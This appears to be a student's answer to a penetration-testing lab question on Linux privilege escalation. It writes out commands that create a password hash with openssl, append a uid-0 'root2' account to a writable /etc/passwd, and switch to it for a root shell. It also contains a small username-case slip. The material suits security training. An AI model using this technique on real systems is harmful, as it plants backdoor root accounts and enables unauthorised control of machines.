Questions 1
Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which hashing algorithm has been used to encrypt the attacker's password?

ssh joe@192.168.214.214
# Generate the hash
openssl passwd w00t
86RTL4MAsPgAo

# add Root2 user to /etc/passwd
echo "root2:86RTL4MAsPgAo:0:0:root:/root:/bin/bash" >> /etc/passwd
su Root2
w00t

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)

# Back to the question 'Which hashing algorithm has been used to encrypt the attacker's password?'
We use openssl to generate the hash and Openssl using crypt algorithm.
